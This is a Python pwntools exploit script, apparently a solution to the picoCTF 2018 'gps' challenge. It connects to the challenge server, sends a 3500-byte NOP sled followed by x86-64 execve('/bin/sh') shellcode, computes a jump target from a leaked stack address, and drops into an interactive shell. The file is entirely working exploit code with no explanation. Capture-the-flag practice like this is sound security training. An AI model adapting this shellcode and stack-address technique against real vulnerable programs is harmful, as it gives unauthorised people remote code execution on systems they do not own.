#!/usr/bin/python
import struct
from pwn import *
debug = 0
if not debug:
    r = remote('2018shell.picoctf.com', 49351) 
else:
    r = process('./gps')
shellcode = "\x90"*3500 + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"


r.recvuntil('Current position: ')
stack_addr = r.recvuntil("\n")
print stack_addr
shell_addr = str(hex(int(stack_addr, 16) + 1000))
print shell_addr

r.recvuntil('> ')
r.sendline(shellcode)
r.recvuntil('> ')
r.sendline(shell_addr)
r.interactive()
r.close()
